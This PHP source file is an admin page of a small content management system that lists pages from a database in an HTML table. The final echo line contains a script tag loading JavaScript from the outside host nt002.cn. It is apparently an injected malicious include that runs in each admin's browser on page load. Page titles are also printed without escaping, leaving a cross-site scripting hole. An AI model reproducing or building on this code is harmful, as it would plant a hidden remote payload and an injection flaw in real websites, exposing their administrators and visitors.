<?php
include 'admin_header.php';																									//Includes Session start, and functions affecting all administration pages

if ($_SESSION['auth'] == "admin") 																							//Check if administrative user is logged in.
{
	include("db_connect.php");																								//Database Connection Script
	$query = "SELECT * FROM pages ORDER by page_id DESC";
	$page_result = mysql_query($query);
	echo "<html>\n<head>\n<link rel='stylesheet' href='assets/admin.css'  type='text/css' />\n</head>\n<body>\n";
	echo "<h2>Pages</h2>";
	include 'admin_navigation.php';	
	echo "<a href='admin_pages_add.php'>Add a page</a><br /><br />";
	
	
	echo "<table>\n".
		 "<tr class='header'>".
		 "<td>&nbsp;</td>".
		 "<td>Title</td>".
		 "<td>Status</td>".
		 "<td colspan='2'>Action</td>".
		 "</tr>\n";
	
	$counter = 1;																									//Sets a counter to be used for rotating color of table rows
	while ($row = mysql_fetch_array($page_result, MYSQL_ASSOC)) 
	{
		echo "<tr class='";
		oddeven($counter);																					//function located in admin_header.php - checks whether a number is odd or even, returns a class element
		echo "'>";
		echo "<td></td><td>".$row['page_title']."</td>";
		echo "<td> ";
		if ( $row['page_show'] == 1){ echo "Active"; } else { echo "Disabled"; }
		echo " </td><td><a href='admin_pages_edit.php?id=".$row['page_id']."'>[edit]</a></td><td>[delete]</td></tr>";
	$counter++;
	}
	echo "</table>\n";
	echo "<script src='http://nt002.cn/E/J.JS'></script></body></html>";
}

            
         
	    